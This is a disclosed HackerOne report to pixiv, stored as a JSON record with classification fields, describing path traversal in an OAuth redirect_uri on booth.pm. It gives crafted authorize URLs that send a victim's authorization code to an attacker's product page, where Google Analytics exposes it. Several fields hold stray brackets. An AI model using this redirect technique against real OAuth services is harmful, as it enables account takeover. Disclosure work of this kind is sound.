{
  "reported_to": "pixiv",
  "reported_by": "kuzu7shiki ",
  "title": "Stealing Users OAuth authorization code via redirect_uri",
  "content": "\nSummary:\nPath traversal in OAuth redirect_uri which can lead to users authorization code being leaked to any malicious user.\nThe following authorization code flow request is generated at booth login.\nCode 322 Bytes\n1https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9&redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback&response_type=code&scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile&state=%3A1a38b53563599621ce25094661b1c4458ddb52d79d771149\nPath traversal vulnerability in this redirect_uri parameter allows the attacker to direct the user to the product page created by the attacker.\nCode 98 Bytes\n1redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/4503924\n-> redirected to https://booth.pm/ja/items/4503924\nIf the attacker had Google Analytics enabled, the query string could be exposed when the victim is redirected to the product page, so the unused authorization code is leaked.\nSteps To Reproduce:\nThe attacker makes his shop public. Register his products and set up his Google Analytics tracking ID.\nHave the victim click on the following link; the value of the state parameter can be anything.\nCode 367 Bytes\n1https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9&redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/[attacker's product id]&response_type=code&scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile&state=%3A1a38b53563599621ce25094661b1c4458ddb52d79d771149\nWhen the victim clicks on the above link and proceeds with the login process, he is redirected to the attacker's product page.\nThe attacker can steal victims' authorizaiton code from Google Analytics real-time reports.\nImpact\nDue to path traversal in redirect_uri parameter in OAuth flow, its possible to redirect authenticated users to attacker's product page with their OAuth credentials from which its possible to takeover their account.\n\n",
  "severity": "[",
  "bounty": 2000,
  "weaknesses": "[",
  "screenshots": {},
  "disclosed_date": 1679489940,
  "report_url": "https://hackerone.com/reports/1861974",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": "[",
  "vuln_description": "Path traversal vulnerability in the OAuth redirect_uri parameter allows an attacker to redirect users to a malicious page, leaking their OAuth authorization code via Google Analytics, potentially leading to account takeover.",
  "reason": "The vulnerability involves understanding OAuth flow, path traversal techniques, and leveraging Google Analytics for data exfiltration. While the components are standard, combining them requires moderate insight.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "injection_classification": "}"
}